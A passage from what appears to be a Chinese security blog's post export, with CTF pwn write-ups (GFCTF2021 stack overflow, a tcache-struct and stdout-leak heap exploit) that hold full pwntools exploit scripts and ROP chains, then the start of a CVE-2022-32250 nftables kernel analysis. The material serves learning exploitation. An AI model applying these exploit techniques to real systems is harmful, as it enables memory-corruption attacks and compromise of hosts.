fp-&gt;_wide_data-&gt;_IO_read_end3.*(fp-&gt;_codecvt+4)=func,参数就是fp-&gt;_codecvt\n\n当然，我们这里依旧需要绕过_IO_flush_all_lokcp函数。\n后面会在梳理house_of_pig也就是在Glibc2.31下的利用。\n\n参考文章https://darkeyer.github.io/2020/08/17/FSOP%E5%9C%A8glibc2.29%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/\nhttps://xz.aliyun.com/t/5579\n","categories":["pwn"],"tags":["FSOP"]},{"title":"GFCTF2021复现","url":"/2022/01/11/GFCTF/","content":"深刻感觉到了这场比赛的难度，要是参加了的话我可能第一道题都完成不了。这次只复现了前面两道，因为第三题考得更多的是代码审计能力吧。\nshell题目保护只开了nx，主函数也是很简单的栈溢出。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  system(&quot;echo &#x27;zltt lost his shell, can you find it?&#x27;&quot;);  read(0, buf, 0x38uLL);  return 0;&#125;\n\n但是问题是题目没有泄漏函数。所以这里存在一个冷知识\n\nsystem(“$0”)同样可以拿到shell\n\n在ida发现tip函数存在\n\ntext段可以即可拿到shell\nfrom pwn import *elf = ELF(&#x27;./shell&#x27;)# r = process(&#x27;./shell&#x27;)r = remote(b&#x27;1.14.71.254&#x27;, 28087)context.log_level = &#x27;debug&#x27;system = elf.plt[&#x27;system&#x27;]pop_rdi = 0x00000000004005e3shell_addr = 0x400541ret = 0x0000000000400416r.recvuntil(b&quot;\\n&quot;)payload = b&#x27;a&#x27;*(0x10+0x8)+p64(pop_rdi)+p64(shell_addr) + \\    p64(0x0000000000400416)+p64(system)r.sendline(payload)r.sendline(b&#x27;cat flag&#x27;)r.interactive()\n\nlook_face_no_patch所需知识点：tcache struct attack,_IO_FILE leak\n这个题目有点绕，不过先把知识点掌握了就好。\ntcache struct attack我这里主要是我自己总结可能阐述不是特别清楚所以看不懂的话可以看https://xz.aliyun.com/t/6828 这篇文章。\n字面意思也就是攻击tcache结构体。\n在做长安战役的比赛的off by one那道题目时我就在想，为什么我malloc一个chunk的时候要多出来一个0x250大小的chunk呢，现在知道这个chunk就是tcache的结构体。\n和unsortedbin里面存的main_arena不同的是tcache的结构体就直接放在heap段的第一个。\n\n可以看到上面的0x251大小的就是tcache结构体，再执行到free然后观察其内部结构。\n(因为刚刚的0x80不具有演示效果我改了一下)\n\n可以看见在tcache struct中heap_base+0x10–&gt;heap_base+0x50之间是存放的counts，而heap_base+0x50–&gt;heap_base+0x250之间存放的这是tcache_entry指针。\n利用方式首先利用double free\n\n此时chunk的fd指针指向的是他本身，而我们已知的tcache struct是在heap_base的位置所以只需要修改后面三位为010(这里是因为tcache_entry指向的是和malloc返回的指针只想同一个位置也就是heap_addr+0x10)所以我们只需要爆破第四位即可，那我们成功的概率也就是1/16。当我们爆破成功之后我们此时malloc两次chunk我们就可以得到tcache的结构体，将前面的内容全部填充为0xff即可绕过tcache，让后面free的chunk进入unsorted bin。\n_IO_FILE leak在我的这一篇博客提到过_IO_FILE write https://cv196082.gitee.io/2021/12/06/echo-back/ 不了解结构体可以先去看一下。\n当然同上面知识点一样，我也只是对于自己的总结可能阐述不清楚，若仍有困惑之处请看这位大师傅的 https://blog.wjhwjhn.com/archives/95/\n我写的那一篇博客提到过，内存中存在着三个文件指针，分别是stderr，stdout，stdin。\n\n这三个文件指针一般存放在bss段上用于输出输入数据，所指向的内容在libc中，而结构体内部的内容是可以被修改的，所以当我们有任意地址写的权限是就可以修改结构体实现stdout leak。下面就是stdout的内部结构：\n\n我们需要修改的是_flags和_IO_write_base，在这之间的三个指针，我们覆盖_IO_write_base势必会覆盖掉它们，但是这是stdout，而上面这三个主要是输入的时候才会有用，所以直接覆盖成p64(0)即可。\ncopy:解释以上指针的作用\n\n其中_IO_buf_base 和_IO_buf_end 是缓冲区建立函数。_IO_doallocbuf 会在里面建立输入输出缓冲区，并把基地址保存在_IO_buf_base 中，结束地址保存在_IO_buf_end 中。在建立里输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址址给_IO_write_base，结束地址给_IO_write_end，同时_IO_write_ptr 表示为已经使用的地址。即_IO_write_base 到_IO_write_ptr 之间的空间是已经使用的缓冲区，_IO_write_ptr 到_IO_write_end 之间为剩余的输出缓冲区。\n\n所以根据以上说法的话，我们只需要将_IO_write_base调小即可输入_IO_write_base与_IO_write_ptr之间的内容。\n_flags为什么也要修改？/* Magic number and bits for the _flags field.  The magic number ismostly vestigial, but preserved for compatibility.  It occupies thehigh 16 bits of _flags; the low 16 bits are actual flag bits.  */#define _IO_MAGIC         0xFBAD0000 /* Magic number */#define _IO_MAGIC_MASK    0xFFFF0000#define _IO_USER_BUF          0x0001 /* Don&#x27;t deallocate buffer on close. */#define _IO_UNBUFFERED        0x0002#define _IO_NO_READS          0x0004 /* Reading not allowed.  */#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */#define _IO_EOF_SEEN          0x0010#define _IO_ERR_SEEN          0x0020#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don&#x27;t call close(_fileno) on close.  */#define _IO_LINKED            0x0080 /* In the list of all open files.  */#define _IO_IN_BACKUP         0x0100#define _IO_LINE_BUF          0x0200#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */#define _IO_CURRENTLY_PUTTING 0x0800#define _IO_IS_APPENDING      0x1000#define _IO_IS_FILEBUF        0x2000/* 0x4000  No longer used, reserved for compat.  */#define _IO_USER_LOCK         0x8000\n\n上面是glibc中给出的常量。\n以puts函数输出的真正调用为例，具体调用的顺序是:\n_IO_puts -&gt; _IO_sputn -&gt; _IO_new_file_xsputn -&gt; _IO_overflow -&gt; _IO_new_file_overflow\n其中检查较为重要的是_IO_new_file_overflow函数。\nif (f-&gt;_flags &amp; _IO_NO_WRITES) / SET ERROR /&#123;    f-&gt;_flags |= _IO_ERR_SEEN;    __set_errno (EBADF);    return EOF;&#125;\n\n_IO_NO_WRITES使用于检验是否可以输出数据的，为1表示禁止，为0表示允许。这个_IO_NO_WRITES在stdout当中为0，在stdin当中为1。根据上面的表达式其实可以看出来我们必须满足 (f-&gt;_flags &amp; _IO_NO_WRITES)==0\n后面检测_IO_CURRENTLY_PUTTING\nif ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)&#123;    /* Allocate a buffer if needed. */    if (f-&gt;_IO_write_base == NULL)    &#123;        _IO_doallocbuf(f);        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);    &#125;    /* Otherwise must be currently reading.    If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,    logically slide the buffer forwards one block (by setting the    read pointers to all point at the beginning of the block).  This    makes room for subsequent output.    Otherwise, set the read pointers to _IO_read_end (leaving that    alone, so it can continue to correspond to the external position). */    if (__glibc_unlikely(_IO_in_backup(f)))    &#123;        size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;        _IO_free_backup_area(f);        f-&gt;_IO_read_base -= MIN(nbackup,                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;    &#125;    if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;    if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;&#125;\n\n主要关心的是_IO_CURRENTLY_PUTTING，这个使用来判断是否初始化的，若是没有初始化过则为0，若是初始化过则为1，一般输出过内容之后就变成了1除非它输出任何东西。如果这里没通过那我们的_IO_write_base会被修改那就达不到泄漏的目的，所以我们要满足 (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)==1\n最后一个检测\nif (do_write)&#123;    count = new_do_write (f, s, do_write);    to_do -= count;    if (count &lt; do_write)    return n - to_do;&#125;\n\n这一部分是进入new_do_write (f, s, do_write);函数。\nstatic size_tnew_do_write(FILE *fp, const char *data, size_t to_do)&#123;    size_t count;    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)        /* On a system without a proper O_APPEND implementation,        you would need to sys_seek(0, SEEK_END) here, but is        not needed nor desirable for Unix- or Posix-like systems.        Instead, just indicate that offset (before and after) is        unpredictable. */        fp-&gt;_offset = _IO_pos_BAD;    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;        off64_t new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);        if (new_pos == _IO_pos_BAD)            return 0;        fp-&gt;_offset = new_pos;    &#125;    count = _IO_SYSWRITE(fp, data, to_do);    if (fp-&gt;_cur_column &amp;&amp; count)        fp-&gt;_cur_column = _IO_adjust_column(fp-&gt;_cur_column - 1, data, count) + 1;    _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))                             ? fp-&gt;_IO_buf_base                             : fp-&gt;_IO_buf_end);    return count;&#125;\n\n这里需要注意的是这两个这两句\nif (fp-&gt;_flags &amp; _IO_IS_APPENDING)\nelse if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)\n我们这里无论进入那一个语句都是可以执行到下面的，但是一般来说我们都会选择进入第一个因为他内部的代码较少，只有一行。\n所以根据上面的结论来说我的可以计算出_flags的值。\n1.(fp-&gt;_flags &amp; _IO_NO_WRITES) == 02.(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 13.(fp-&gt;_flags &amp; _IO_IS_APPENDING) == 1\n\n计算可得，fp-&gt;_flags = 0xfbad1800, 其中_IO_MAGIC = 0xfdab0000，这是个 Magic Number，是固定的。\n一般的利用方式一般是将chunk释放进unsorted bin当中，是chunk保存main_arena，然后利用partial overwrite爆破出_IO_2_1_stdout_结构体的位置，随后就是根据上面得出来的值得到_IO_2_1_stdout_的地址来获取libc\n解题有了以上的基础我们才可以正式开始看这道题目。\n检查保护\n保护全开，好样的！\n流程分析题目类型是很常规的菜单题，但是没有edit函数和show函数。先看add函数\nunsigned __int64 add()&#123;  int i; // [rsp+8h] [rbp-498h]  int v2; // [rsp+Ch] [rbp-494h]  char s[1160]; // [rsp+10h] [rbp-490h] BYREF  unsigned __int64 v4; // [rsp+498h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 0, 0x80uLL);  puts(&quot;cont...&quot;);  v2 = read(0, s, 0x78uLL);  if ( v2 &gt; 112 || v2 &lt; 0 )    run();  s[v2] = 10;  ptr = malloc(v2);  for ( i = 0; s[i] != 10; ++i )    *((_BYTE *)ptr + i) = s[i];  puts(&quot;OK&quot;);  return v4 - __readfsqword(0x28u);&#125;\n\n这里我们malloc的chunk的size是由我们输入的内容长度确定的，而下面的for循环，是将数据写进去，当出现b’\\n’时就会结束循环停止写入。\n再看dele函数\nint dele()&#123;  if ( !ptr )    run();  if ( (unsigned int)dele_time &gt; 2 )    run();  free(ptr);  ++dele_time;  return puts(&quot;OK&quot;);&#125;\n\n这个题很怪的一点就是我们只能删除当前创建的chunk并且总共只能删除三次，而且nssctf贴心的告诉了我们题目运行的环境是ubuntu18那libc版本就是2.27那就代表存在tcache，在不知道tcache struct attack的情况就直接想放弃了。\n利用分析\n首先利用double free让我们创建chunk的fd指针只想自身。\n\n可以看到我们利用爆破最后一个字节修改了tcache struct当中记录counts的值，再观察一下bin的情况\n\n后面也是一样的。接着我们释放chunk，此时储存tcache struct的chunk进入unsorted bin。\n\n接着我们创建一个0x50大小的chunk(至于为什么我放到代码当中解释)。\n\n接着开始猜stdout的地址。到这一步，成功的概率只有1/256了所以我就不做过程截图了(因为我自己打本地的时候等了五六分钟，他给我来一句程序运行太多，就没了)所以下面直接给exp了。\nexpfrom pwn import *from LibcSearcher import *elf = ELF(&quot;./look_face_no_patch&quot;)r = process(&#x27;./look_face_no_patch&#x27;)context.log_level = &#x27;debug&#x27;def create(contents):    r.recvuntil(b&#x27;&gt;&gt;&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;cont...&#x27;)    r.sendline(contents)def delete():    r.recvuntil(b&#x27;&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)def boom():    create(b&#x27;\\x00&#x27;*0x30)    delete()    delete()    heap = 0x8010    create((p16(heap)+b&#x27;\\n&#x27;).ljust(0x30, b&#x27;\\x00&#x27;))    create(b&quot;\\n&quot;.ljust(0x30, b&#x27;\\x00&#x27;))    create(b&#x27;\\xff&#x27;*0x30)    delete()    create(b&#x27;\\x00&#x27;*0x40)# 放开前面的counts区域，修改后面的tcache_entry指针，并且是tcache_counts为0，为后续做铺垫    stdout = 0x8760    create((p16(stdout)+b&#x27;\\n&#x27;).ljust(0x10, b&#x27;\\x00&#x27;))# 开始爆破stdout的地址(也只需要爆破一位)，这一块chunk是切割的unsorted bin当中的内容，也就是tcache_struct，下去思考一下就能想到我们爆破的是tcache大小为0x40的指针    create((p64(0xfbad1800)+p64(0)*3+p64(0x60)+b&#x27;\\n&#x27;).ljust(0x30, b&#x27;\\x00&#x27;))# 这一步开始修改结构体内部的值    r.recvuntil(b&#x27;\\n&#x27;)    if u64(r.recv(8)) != 0xfbad1800:        return 0    r.recv(0x20)    stdout = u64(r.recv(6).ljust(0x8, b&#x27;\\x00&#x27;))-131    print(hex(stdout))    # libc = LibcSearcher(&#x27;_IO_2_1_stdout_&#x27;, stdout)    libc = ELF(&#x27;./libc-2.27.so&#x27;)    # success(libc.address)    libc_base = stdout-libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]    pop_rdi = 0x000000000002155f+libc_base    pop_rsi = 0x0000000000023e8a+libc_base    pop_rdx = 0x0000000000001b96+libc_base    push_rsp = 0x0000000000024ef4+libc_base    open_addr = libc_base+libc.symbols[&#x27;open&#x27;]    read_addr = libc_base+libc.symbols[&#x27;read&#x27;]    write_addr = libc_base+libc.symbols[&#x27;write&#x27;]    malloc_hook = libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]    create((p64(malloc_hook)+b&#x27;\\n&#x27;).ljust(0x10, b&#x27;\\x00&#x27;))# 这一步我们又是从unsorted bin当中切出来位置，但因为上面用了0x20所以我们修改的tcache_entry是大小为0x80的chunk。后面就是正常的构造ROP了    create((p64(push_rsp)+b&#x27;/flag&#x27;+b&#x27;\\n&#x27;).ljust(0x70, b&#x27;\\x00&#x27;))    payload = p64(pop_rdi)+p64(malloc_hook+0x8)+p64(open_addr)+p64(pop_rdi) + \\        p64(3)+p64(pop_rdx)+p64(0x50)+p64(pop_rsi) + \\        p64(malloc_hook+10)+p64(puts)+b&#x27;\\n&#x27;    create(payload.ljust(0x70, b&#x27;\\x00&#x27;))if __name__ == &#x27;__main__&#x27;:    while 1:        try:            res = boom()            if(res == 0):                r = process(&#x27;./look_face_no_patch&#x27;)                continue            break        except:            r = process(&#x27;./look_face_no_patch&#x27;)            continue    gdb.attach(r)    r.interactive()\n\n上面代码解释可能难以理解，所以我画了一张图。\n我们将存放tcache_struct的chunk释放进unsorted bin当中的后续情况如下图：\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"CVE-2022-32250复现","url":"/2023/09/06/CVE-2022-32250/","content":"前言因为工作目前面对着一个不怎么熟悉的netfilter这一模块，所以直接复现一个以往的CVE来认识认识这个模块。\n这里介绍这个模块可能不会很好，所以不熟悉的朋友可以去看 https://www.secrss.com/articles/44817 这篇文章。\nnftables介绍nftables取代了流行的&#123;ip,ip6,arp,eb&#125;tables。该软件提供了一个新的内核数据包分类框架，该框架基于特定于网络的虚拟机 (VM) 和新的nft用户空间命令行工具。nftables重用了现有的netfilter子系统，例如现有的钩子基础设施、连接跟踪系统、NAT、用户空间队列和日志子系统。对于nftables，只需要扩展expression即可，用户自行编写expression，然后让nftables虚拟机执行它。nftables框架的数据结构如下所示：\nTable&#123;   Chain[     Rule       (expression1,expression2,expression3,...)          | | |--&gt; expression_action          | |--&gt; expression_action          |--&gt;expression_action     Rule         (expression,expression,expression,...)     ...  ],  Chain[     ...  ],  ...&#125;\n\nTable为chain的容器，chain为rule的容器，rule为expression的容器，expression响应action。构造成由 table-&gt;chain-&gt;rule-&gt;expression 四级组成的数据结构。\nnfnetlink初始化static int __net_init nfnetlink_net_init(struct net *net)&#123;\tstruct sock *nfnl;\tstruct netlink_kernel_cfg cfg = &#123;\t\t.groups\t= NFNLGRP_MAX,\t\t.input\t= nfnetlink_rcv,#ifdef CONFIG_MODULES\t\t.bind\t= nfnetlink_bind,#endif\t&#125;;\tnfnl = netlink_kernel_create(net, NETLINK_NETFILTER, &amp;cfg);\tif (!nfnl)\t\treturn -ENOMEM;\tnet-&gt;nfnl_stash = nfnl;\trcu_assign_pointer(net-&gt;nfnl, nfnl);\treturn 0;&#125;\n\n在nfnetlink_net_init函数中定义了netlink_kernel_cfg结构，并传给了netlink_kernel_create进行创建。在后续接收消息的时候就会调用nfnetlink_rcv函数了。\nstatic void nfnetlink_rcv(struct sk_buff *skb)&#123;\tstruct nlmsghdr *nlh = nlmsg_hdr(skb);\tif (skb-&gt;len &lt; NLMSG_HDRLEN ||\t    nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||\t    skb-&gt;len &lt; nlh-&gt;nlmsg_len)\t\treturn;\tif (!netlink_net_capable(skb, CAP_NET_ADMIN)) &#123;\t\tnetlink_ack(skb, nlh, -EPERM, NULL);\t\treturn;\t&#125;\tif (nlh-&gt;nlmsg_type == NFNL_MSG_BATCH_BEGIN)\t\tnfnetlink_rcv_skb_batch(skb, nlh);\telse\t\tnetlink_rcv_skb(skb, nfnetlink_rcv_msg);&#125;\n\n其中需要CAP_NET_ADMIN才能访问，如果编译时开启了CONFIG_USER_NS那么普通用户也是可以访问的。\n\n以上就是nfnetlink接收消息的完整调用链了。\nstatic void nfnetlink_rcv_batch(struct sk_buff *skb, struct nlmsghdr *nlh,\t\t\t\tu16 subsys_id, u32 genid)&#123;\tstruct sk_buff *oskb = skb;\tstruct net *net = sock_net(skb-&gt;sk);\tconst struct nfnetlink_subsystem *ss;\tconst struct nfnl_callback *nc;\tstruct netlink_ext_ack extack;\tLIST_HEAD(err_list);\tu32 status;\tint err;\tif (subsys_id &gt;= NFNL_SUBSYS_COUNT)\t\treturn netlink_ack(skb, nlh, -EINVAL, NULL);replay:\tstatus = 0;\tskb = netlink_skb_clone(oskb, GFP_KERNEL);\tif (!skb)\t\treturn netlink_ack(oskb, nlh, -ENOMEM, NULL);\tnfnl_lock(subsys_id);\tss = nfnl_dereference_protected(subsys_id);\tif (!ss) &#123;#ifdef CONFIG_MODULES\t\tnfnl_unlock(subsys_id);\t\trequest_module(&quot;nfnetlink-subsys-%d&quot;, subsys_id);\t\tnfnl_lock(subsys_id);\t\tss = nfnl_dereference_protected(subsys_id);\t\tif (!ss)#endif\t\t&#123;\t\t\tnfnl_unlock(subsys_id);\t\t\tnetlink_ack(oskb, nlh, -EOPNOTSUPP, NULL);\t\t\treturn kfree_skb(skb);\t\t&#125;\t&#125;\tif (!ss-&gt;valid_genid || !ss-&gt;commit || !ss-&gt;abort) &#123;\t\tnfnl_unlock(subsys_id);\t\tnetlink_ack(oskb, nlh, -EOPNOTSUPP, NULL);\t\treturn kfree_skb(skb);\t&#125;\tif (!try_module_get(ss-&gt;owner)) &#123;\t\tnfnl_unlock(subsys_id);\t\tnetlink_ack(oskb, nlh, -EOPNOTSUPP, NULL);\t\treturn kfree_skb(skb);\t&#125;\tif (!ss-&gt;valid_genid(net, genid)) &#123;\t\tmodule_put(ss-&gt;owner);\t\tnfnl_unlock(subsys_id);\t\tnetlink_ack(oskb, nlh, -ERESTART, NULL);\t\treturn kfree_skb(skb);\t&#125;\tnfnl_unlock(subsys_id);\twhile (skb-&gt;len &gt;= nlmsg_total_size(0)) &#123;\t\tint msglen, type;\t\tif (fatal_signal_pending(current)) &#123;\t\t\tnfnl_err_reset(&amp;err_list);\t\t\terr = -EINTR;\t\t\tstatus = NFNL_BATCH_FAILURE;\t\t\tgoto done;\t\t&#125;\t\tmemset(&amp;extack, 0, sizeof(extack));\t\tnlh = nlmsg_hdr(skb);\t\terr = 0;\t\tif (nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||\t\t    skb-&gt;len &lt; nlh-&gt;nlmsg_len ||\t\t    nlmsg_len(nlh) &lt; sizeof(struct nfgenmsg)) &#123;\t\t\tnfnl_err_reset(&amp;err_list);\t\t\tstatus |= NFNL_BATCH_FAILURE;\t\t\tgoto done;\t\t&#125;\t\t/* Only requests are handled by the kernel */\t\tif (!(nlh-&gt;nlmsg_flags &amp; NLM_F_REQUEST)) &#123;\t\t\terr = -EINVAL;\t\t\tgoto ack;\t\t&#125;\t\ttype = nlh-&gt;nlmsg_type;\t\tif (type == NFNL_MSG_BATCH_BEGIN) &#123;\t\t\t/* Malformed: Batch begin twice */\t\t\tnfnl_err_reset(&amp;err_list);\t\t\tstatus |= NFNL_BATCH_FAILURE;\t\t\tgoto done;\t\t&#125; else if (type == NFNL_MSG_BATCH_END) &#123;\t\t\tstatus |= NFNL_BATCH_DONE;\t\t\tgoto done;\t\t&#125; else if (type &lt; NLMSG_MIN_TYPE) &#123;\t\t\terr = -EINVAL;\t\t\tgoto ack;\t\t&#125;\t\t/* We only accept a batch with messages for the same\t\t * subsystem.\t\t */\t\tif (NFNL_SUBSYS_ID(type) != subsys_id) &#123;\t\t\terr = -EINVAL;\t\t\tgoto ack;\t\t&#125;\t\tnc = nfnetlink_find_client(type, ss);\t\tif (!nc) &#123;\t\t\terr = -EINVAL;\t\t\tgoto ack;\t\t&#125;\t\t&#123;\t\t\tint min_len = nlmsg_total_size(sizeof(struct nfgenmsg));\t\t\tu8 cb_id = NFNL_MSG_TYPE(nlh-&gt;nlmsg_type);\t\t\tstruct nlattr *cda[NFNL_MAX_ATTR_COUNT + 1];\t\t\tstruct nlattr *attr = (void *)nlh + min_len;\t\t\tint attrlen = nlh-&gt;nlmsg_len - min_len;\t\t\t/* Sanity-check NFTA_MAX_ATTR */\t\t\tif (ss-&gt;cb[cb_id].attr_count &gt; NFNL_MAX_ATTR_COUNT) &#123;\t\t\t\terr = -ENOMEM;\t\t\t\tgoto ack;\t\t\t&#125;\t\t\terr = nla_parse(cda, ss-&gt;cb[cb_id].attr_count, attr,\t\t\t\t\tattrlen, ss-&gt;cb[cb_id].policy, NULL);\t\t\tif (err &lt; 0)\t\t\t\tgoto ack;\t\t\tif (nc-&gt;call_batch) &#123;\t\t\t\terr = nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,\t\t\t\t\t\t     (const struct nlattr **)cda,\t\t\t\t\t\t     &amp;extack);\t\t\t&#125;\t\t\t/* The lock was released to autoload some module, we\t\t\t * have to abort and start from scratch using the\t\t\t * original skb.\t\t\t */\t\t\tif (err == -EAGAIN) &#123;\t\t\t\tstatus |= NFNL_BATCH_REPLAY;\t\t\t\tgoto done;\t\t\t&#125;\t\t&#125;ack:\t\tif (nlh-&gt;nlmsg_flags &amp; NLM_F_ACK || err) &#123;\t\t\t/* Errors are delivered once the full batch has been\t\t\t * processed, this avoids that the same error is\t\t\t * reported several times when replaying the batch.\t\t\t */\t\t\tif (nfnl_err_add(&amp;err_list, nlh, err, &amp;extack) &lt; 0) &#123;\t\t\t\t/* We failed to enqueue an error, reset the\t\t\t\t * list of errors and send OOM to userspace\t\t\t\t * pointing to the batch header.\t\t\t\t */\t\t\t\tnfnl_err_reset(&amp;err_list);\t\t\t\tnetlink_ack(oskb, nlmsg_hdr(oskb), -ENOMEM,\t\t\t\t\t    NULL);\t\t\t\tstatus |= NFNL_BATCH_FAILURE;\t\t\t\tgoto done;\t\t\t&#125;\t\t\t/* We don&#x27;t stop processing the batch on errors, thus,\t\t\t * userspace gets all the errors that the batch\t\t\t * triggers.\t\t\t */\t\t\tif (err)\t\t\t\tstatus |= NFNL_BATCH_FAILURE;\t\t&#125;\t\tmsglen = NLMSG_ALIGN(nlh-&gt;nlmsg_len);\t\tif (msglen &gt; skb-&gt;len)\t\t\tmsglen = skb-&gt;len;\t\tskb_pull(skb, msglen);\t&#125;done:\tif (status &amp; NFNL_BATCH_REPLAY) &#123;\t\tss-&gt;abort(net, oskb);\t\tnfnl_err_reset(&amp;err_list);\t\tkfree_skb(skb);\t\tmodule_put(ss-&gt;owner);\t\tgoto replay;\t&#125; else if (status == NFNL_BATCH_DONE) &#123;\t\terr = ss-&gt;commit(net, oskb);\t\tif (err == -EAGAIN) &#123;\t\t\tstatus |= NFNL_BATCH_REPLAY;\t\t\tgoto done;\t\t&#125; else if (err) &#123;\t\t\tss-&gt;abort(net, oskb);\t\t\tnetlink_ack(oskb, nlmsg_hdr(oskb), err, NULL);\t\t&#125;\t&#125; else &#123;\t\tss-&gt;abort(net, oskb);\t&#125;\tif (ss-&gt;cleanup)\t\tss-&gt;cleanup(net);\tnfnl_err_deliver(&amp;err_list, oskb);\tkfree_skb(skb);\tmodule_put(ss-&gt;owner);&#125;\n\n首先通过\nss = nfnl_dereference_protected(subsys_id);\n\n取出subsys_id对应的\n#define NFNL_SUBSYS_NONE \t\t0#define NFNL_SUBSYS_CTNETLINK\t\t1#define NFNL_SUBSYS_CTNETLINK_EXP\t2#define NFNL_SUBSYS_QUEUE\t\t3#define NFNL_SUBSYS_ULOG\t\t4#define NFNL_SUBSYS_OSF\t\t\t5#define NFNL_SUBSYS_IPSET\t\t6#define NFNL_SUBSYS_ACCT\t\t7#define NFNL_SUBSYS_CTNETLINK_TIMEOUT\t8#define NFNL_SUBSYS_CTHELPER\t\t9#define NFNL_SUBSYS_NFTABLES\t\t10#define NFNL_SUBSYS_NFT_COMPAT\t\t11#define NFNL_SUBSYS_HOOK\t\t12#define NFNL_SUBSYS_COUNT\t\t13\n\n这里我们对nftables进行操作那就很明显是0xa\nstatic inline const struct nfnl_callback *nfnetlink_find_client(u16 type, const struct nfnetlink_subsystem *ss)&#123;\tu8 cb_id = NFNL_MSG_TYPE(type);\tif (cb_id &gt;= ss-&gt;cb_count)\t\treturn NULL;\treturn &amp;ss-&gt;cb[cb_id];&#125;\n\n在获得subsystem之后就会进入上面的函数，拿到对应的客户端\nstatic const struct nfnetlink_subsystem nf_tables_subsys = &#123;    .name       = &quot;nf_tables&quot;,    .subsys_id  = NFNL_SUBSYS_NFTABLES,    .cb_count   = NFT_MSG_MAX,    .cb     = nf_tables_cb,    .commit     = nf_tables_commit,    .abort      = nf_tables_abort,    .cleanup    = nf_tables_cleanup,    .valid_genid    = nf_tables_valid_genid,    .owner      = THIS_MODULE,&#125;;\n\nstatic const struct nfnl_callback nf_tables_cb[NFT_MSG_MAX] = &#123;\t[NFT_MSG_NEWTABLE] = &#123;\t\t.call_batch\t= nf_tables_newtable,\t\t.attr_count\t= NFTA_TABLE_MAX,\t\t.policy\t\t= nft_table_policy,\t&#125;,\t[NFT_MSG_GETTABLE] = &#123;\t\t.call_rcu\t= nf_tables_gettable,\t\t.attr_count\t= NFTA_TABLE_MAX,\t\t.policy\t\t= nft_table_policy,\t&#125;,\t[NFT_MSG_DELTABLE] = &#123;\t\t.call_batch\t= nf_tables_deltable,\t\t.attr_count\t= NFTA_TABLE_MAX,\t\t.policy\t\t= nft_table_policy,\t&#125;,\t[NFT_MSG_NEWCHAIN] = &#123;\t\t.call_batch\t= nf_tables_newchain,\t\t.attr_count\t= NFTA_CHAIN_MAX,\t\t.policy\t\t= nft_chain_policy,\t&#125;,\t[NFT_MSG_GETCHAIN] = &#123;\t\t.call_rcu\t= nf_tables_getchain,\t\t.attr_count\t= NFTA_CHAIN_MAX,\t\t.policy\t\t= nft_chain_policy,\t&#125;,\t[NFT_MSG_DELCHAIN] = &#123;\t\t.call_batch\t= nf_tables_delchain,\t\t.attr_count\t= NFTA_CHAIN_MAX,\t\t.policy\t\t= nft_chain_policy,\t&#125;,\t[NFT_MSG_NEWRULE] = &#123;\t\t.call_batch\t= nf_tables_newrule,\t\t.attr_count\t= NFTA_RULE_MAX,\t\t.policy\t\t= nft_rule_policy,\t&#125;,\t[NFT_MSG_GETRULE] = &#123;\t\t.call_rcu\t= nf_tables_getrule,\t\t.attr_count\t= NFTA_RULE_MAX,\t\t.policy\t\t= nft_rule_policy,\t&#125;,\t[NFT_MSG_DELRULE] = &#123;\t\t.call_batch\t= nf_tables_delrule,\t\t.attr_count\t= NFTA_RULE_MAX,\t\t.policy\t\t= nft_rule_policy,\t&#125;,\t[NFT_MSG_NEWSET] = &#123;\t\t.call_batch\t= nf_tables_newset,\t\t.attr_count\t= NFTA_SET_MAX,\t\t.policy\t\t= nft_set_policy,\t&#125;,\t[NFT_MSG_GETSET] = &#123;\t\t.call_rcu\t= nf_tables_getset,\t\t.attr_count\t= NFTA_SET_MAX,\t\t.policy\t\t= nft_set_policy,\t&#125;,\t[NFT_MSG_DELSET] = &#123;\t\t.call_batch\t= nf_tables_delset,\t\t.attr_count\t= NFTA_SET_MAX,\t\t.policy\t\t= 